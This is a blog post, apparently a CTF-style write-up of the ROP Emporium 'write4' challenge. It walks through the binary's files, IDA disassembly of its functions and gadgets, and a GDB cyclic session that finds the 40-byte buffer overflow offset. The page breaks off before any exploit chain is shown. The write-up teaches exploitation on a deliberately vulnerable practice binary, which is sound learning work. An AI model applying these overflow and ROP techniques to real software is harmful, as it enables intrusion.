<!DOCTYPE html>
<html lang="en">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="atx0mg">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="atx0mg">
    
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta name="description" content="challenge link Goal Manipulate writeable address and with rop we can read any file.  Read More →">
<meta property="og:type" content="article">
<meta property="og:title" content="write4 rop">
<meta property="og:url" content="https://jeff14994.github.io/2022/03/11/write4-rop/index.html">
<meta property="og:site_name" content="atx0mg">
<meta property="og:description" content="challenge link Goal Manipulate writeable address and with rop we can read any file.  Read More →">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-03-10T17:38:21.000Z">
<meta property="article:modified_time" content="2025-04-10T03:37:48.564Z">
<meta property="article:author" content="atx0mg">
<meta property="article:tag" content="wargame">
<meta property="article:tag" content="2022">
<meta property="article:tag" content="rop">
<meta property="article:tag" content="ROP Emporium">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/portfolio.ico">
    
    <title>write4 rop · atx0mg&#39;s Fortress</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
    <link rel="stylesheet" href="/css/dark.css">
    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 6.1.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>atx0mg's Fortress.</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">atx0mg&#39;s Fortress.</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">write4 rop</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                write4 rop
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
    
        <a class="post-tag" href="javascript:void(0);" data-tags="wargame">wargame</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="2022">2022</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="rop">rop</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="ROP Emporium">ROP Emporium</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
    
</div>

                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">1.8k</span>Reading time: <span class="post-count reading-time">11 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2022/03/11</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <p><a target="_blank" rel="noopener" href="https://ropemporium.com/challenge/write4.html">challenge link</a></p>
<h2 id="Goal"><a href="#Goal" class="headerlink" title="Goal"></a>Goal</h2><ul>
<li>Manipulate writeable address and with rop we can read any file.</li>
</ul>
<p><a href="https://jeff14994.github.io/2022/03/11/write4-rop" target="_self">Read More →</a></p>
<span id="more"></span>
<p>Key points:</p>
<ul>
<li>Where to write? (e.g., The address should be writable and will not change during runtime to be a filename)</li>
<li>What to write? (e.g., What filename do we desire? How to concatenate the strings?)</li>
<li>How to make a ROP chain? (e.g., What gadget to find? In this challenge, <code>rdi</code> only consumes pointer, so how to pass the pointer to <code>rdi</code>?)</li>
</ul>
<p>My first thought:</p>
<ul>
<li>Make a symlink that points to the <code>nonexistent -&gt; flag.txt,</code> so we can get the flag easily (it will work just by calling the usefulFunction). But it turns out that it will only work locally, and if we want to solve the pwn challenge remotely, we stand no chance of changing the server’s environment.</li>
</ul>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><details>
<summary style="display:list-item">Challenge Hint</summary>


<blockquote>
<p><strong>Read&#x2F;Write</strong><br>Hopefully, you’ve realised that ROP is just a form of arbitrary code execution and if we get creative, we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge, we won’t be using built-in functionality since that’s too similar to the previous challenges, instead we’ll be looking for gadgets that let us write a value to memory such as <strong>mov [reg], reg</strong>.</p>
</blockquote>
<blockquote>
<p><strong>What&#x2F;Where</strong><br>Perhaps the most important thing to consider in this challenge is where we’re going to write our <strong>“flag.txt”</strong> string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose. Consider how much space each section might give you to work with and whether corrupting the information stored at these locations will cause you problems later if you need some kind of stability from this program.</p>
</blockquote>
<blockquote>
<p><strong>Decisions, decisions</strong><br>Once you’ve figured out how to write your string into memory and where to write it, go ahead and call <strong>print_file()</strong> with its location as its only argument. You could consider wrapping your write gadgets in helper a function; if you can write a 4 or 8 byte value to a location in memory, you could craft a function (e.g. in Python using pwntools) that takes a string and a memory location and returns a ROP chain that will write that string to your chosen location. Crafting templates like this will make your life much easier in the long run. As ever, with the MIPS challenge, don’t forget about the branch delay slot.</p>
</blockquote>
</details>


<h2 id="Let’s-download-the-binary"><a href="#Let’s-download-the-binary" class="headerlink" title="Let’s download the binary!"></a>Let’s download the binary!</h2><details>
    <summary style="display:list-item">unzip</summary>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ unzip -l write4.zip</span><br><span class="line">Archive:  write4.zip</span><br><span class="line">  Length      Date    Time    Name</span><br><span class="line">---------  ---------- -----   ----</span><br><span class="line">     <span class="number">8384</span>  <span class="number">2020</span><span class="number">-07</span><span class="number">-08</span> <span class="number">07</span>:<span class="number">19</span>   write4</span><br><span class="line">     <span class="number">8392</span>  <span class="number">2020</span><span class="number">-07</span><span class="number">-08</span> <span class="number">07</span>:<span class="number">19</span>   libwrite4.so</span><br><span class="line">       <span class="number">33</span>  <span class="number">2020</span><span class="number">-07</span><span class="number">-03</span> <span class="number">02</span>:<span class="number">28</span>   flag.txt</span><br><span class="line">---------                     -------</span><br><span class="line">    <span class="number">16809</span>                     <span class="number">3</span> files</span><br></pre></td></tr></table></figure>

</details>

<p>We got three files from the <code>write4.zip.</code></p>
<details>
    <summary style="display:list-item">ldd</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ ldd write4</span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffd40583000</span>)</span><br><span class="line">        libwrite4.so =&gt; ./libwrite4.so (<span class="number">0x00007faba2c09000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007faba2a01000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007faba2e0d000</span>)</span><br></pre></td></tr></table></figure>

</details>

<p><code>write4</code> is the primary binary.<br><code>libwrite4.so</code> is the library <code>write4.</code>(we can find it out with <code>ldd</code>)<br><code>flag.txt</code> is our target filename.</p>
<h2 id="Static-Analysis-with-IDA-Pro"><a href="#Static-Analysis-with-IDA-Pro" class="headerlink" title="Static Analysis (with IDA Pro)"></a>Static Analysis (with IDA Pro)</h2><p>First take a look at main function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400607</span>                         ; <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">.text:0000000000400607                         public main</span><br><span class="line">.text:0000000000400607                         main proc near</span><br><span class="line">.text:0000000000400607 55                      push    rbp</span><br><span class="line">.text:0000000000400608 48 89 E5                mov     rbp, rsp</span><br><span class="line">.text:000000000040060B E8 F0 FE FF FF          call    _pwnme</span><br><span class="line">.text:0000000000400610 B8 00 00 00 00          mov     eax, 0</span><br><span class="line">.text:0000000000400615 5D                      pop     rbp</span><br><span class="line">.text:0000000000400616 C3                      retn</span><br><span class="line">.text:0000000000400616                         main endp</span><br></pre></td></tr></table></figure>
<details>
<summary style="display:list-item">external function</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400500</span>                         ; __int64 __fastcall <span class="title function_">pwnme</span><span class="params">(__int64, __int64, __int64)</span></span><br><span class="line">.plt:0000000000400500                         _pwnme proc near</span><br><span class="line">.plt:0000000000400500 FF 25 12 0B 20 00       jmp     cs:off_601018</span><br><span class="line">.plt:0000000000400500                         _pwnme endp</span><br></pre></td></tr></table></figure>
</details>

<p>We can see the main function is calling <code>_pwnme,</code> which is an external function in <code>libwrite4.so.</code></p>
<details>
<summary style="display:list-item">usefulFunction</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400617</span> usefulFunction  proc near</span><br><span class="line">.text:<span class="number">0000000000400617</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400618</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 mov     edi, offset aNonexistent ; <span class="string">&quot;nonexistent&quot;</span></span><br><span class="line">.text:<span class="number">0000000000400620</span>                 call    _print_file</span><br><span class="line">.text:<span class="number">0000000000400625</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000400626</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000400627</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400627</span> usefulFunction  endp</span><br></pre></td></tr></table></figure>
</details>

<p>The binary provides a <code>usefulFunction</code> which moves <code>&quot;nonexistent&quot;</code> to <code>edi</code> and calls <code>_print_file</code>. We know from calling convention that <code>edi</code> will be the first argument for <code>_print_file</code> that we can exploit. If we can change <code>&quot;nonexistent&quot;</code>  to <code>&quot;./flag.txt&quot;</code>, we will have a chance to capture the flag!</p>
<details>
<summary style="display:list-item">usefulGadgets</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 mov     [r14], r15</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062B</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040062</span>C                 align <span class="number">10</span>h</span><br></pre></td></tr></table></figure>
</details>

<p>Although it doesn’t show in the list of functions in IDA Pro, we can find it under the <code>usefulFuntion</code> in assembly mode. We will use this gadget to pass the pointer of the file name.</p>
<h2 id="Dynamic-Analysis-with-GDB"><a href="#Dynamic-Analysis-with-GDB" class="headerlink" title="Dynamic Analysis (with GDB)"></a>Dynamic Analysis (with GDB)</h2><p>Purpose: To find the padding before the <code>return address.</code><br>There are two ways to find the buffer size:</p>
<details>
    <summary style="display:list-item">1. Use GDB</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. Create payload</span></span><br><span class="line">echo $(cyclic <span class="number">100</span>) &gt; payload</span><br><span class="line"><span class="comment">// 2. See from gdb to know where the binary chokes at</span></span><br><span class="line">gdb ./write4</span><br><span class="line">r &lt; payload</span><br><span class="line"><span class="comment">// Tracing buffer size in gdb</span></span><br><span class="line"><span class="number">0x007fffffffe0a8</span>│+<span class="number">0x0000</span>: <span class="string">&quot;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]&quot;</span>      ← $rsp</span><br><span class="line"><span class="number">0x007fffffffe0b0</span>│+<span class="number">0x0008</span>: <span class="string">&quot;maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0b8</span>│+<span class="number">0x0010</span>: <span class="string">&quot;oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0c0</span>│+<span class="number">0x0018</span>: <span class="string">&quot;qaaaraaasaaataaauaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0c8</span>│+<span class="number">0x0020</span>: <span class="string">&quot;saaataaauaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0d0</span>│+<span class="number">0x0028</span>: <span class="string">&quot;uaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0d8</span>│+<span class="number">0x0030</span>: <span class="string">&quot;waaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0e0</span>│+<span class="number">0x0038</span>: <span class="number">0x00000a61616179</span> (<span class="string">&quot;yaaa\n&quot;</span>?)</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:<span class="number">64</span> ────</span><br><span class="line">   <span class="number">0x7ffff7dc893b</span> &lt;pwnme+<span class="number">145</span>&gt;      call   <span class="number">0x7ffff7dc8730</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">   <span class="number">0x7ffff7dc8940</span> &lt;pwnme+<span class="number">150</span>&gt;      nop</span><br><span class="line">   <span class="number">0x7ffff7dc8941</span> &lt;pwnme+<span class="number">151</span>&gt;      leave</span><br><span class="line"> → <span class="number">0x7ffff7dc8942</span> &lt;pwnme+<span class="number">152</span>&gt;      ret</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#<span class="number">0</span>] Id <span class="number">1</span>, Name: <span class="string">&quot;write4&quot;</span>, stopped <span class="number">0x7ffff7dc8942</span> in <span class="title function_">pwnme</span> <span class="params">()</span>, reason: SIGSEGV</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x7ffff7dc8942 → <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/8b $rsp</span><br><span class="line">0x7fffffffe0a8: 0x6b    0x61    0x61    0x61    0x6c    0x61    0x61    0x61</span><br><span class="line"><span class="comment">// We can see directly from the $rsp and get `kaaa` for the first 4 bytes:</span></span><br><span class="line">$rsp   : 0x007fffffffe0a8  →  &quot;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]&quot;</span><br><span class="line"><span class="comment">// 3. Find the offset</span></span><br><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/03_03$ cyclic -l kaaa</span><br><span class="line">40</span><br></pre></td></tr></table></figure>
</details>

<p>Use cyclic to count the offset from <code>rsp</code> (don’t need any arithmetic) and we can get the padding is <code>40.</code></p>
<details>
<summary style="display:list-item">2. Read pwnme() assembly</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public pwnme</span><br><span class="line">pwnme proc near</span><br><span class="line"></span><br><span class="line">s= byte ptr <span class="number">-20</span>h</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, cs:stdout_ptr</span><br><span class="line">mov     rax, [rax]</span><br><span class="line">mov     ecx, <span class="number">0</span>          ; n</span><br><span class="line">mov     edx, <span class="number">2</span>          ; modes</span><br><span class="line">mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setvbuf</span><br><span class="line">lea     rdi, s          ; <span class="string">&quot;write4 by ROP Emporium&quot;</span></span><br><span class="line">call    _puts</span><br><span class="line">lea     rdi, aX8664     ; <span class="string">&quot;x86_64\n&quot;</span></span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span>  ; n</span><br><span class="line">mov     esi, <span class="number">0</span>          ; c</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _memset</span><br><span class="line">lea     rdi, aGoAheadAndGive ; <span class="string">&quot;Go ahead and give me the input already!&quot;</span>...</span><br><span class="line">call    _puts</span><br><span class="line">lea     rdi, format     ; <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, <span class="number">200</span>h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">call    _read</span><br><span class="line">lea     rdi, aThankYou  ; <span class="string">&quot;Thank you!&quot;</span></span><br><span class="line">call    _puts</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">pwnme endp</span><br></pre></td></tr></table></figure>
</details>

<p>Look through the code from IDA Pro (which is more straightforward.)</p>
<ul>
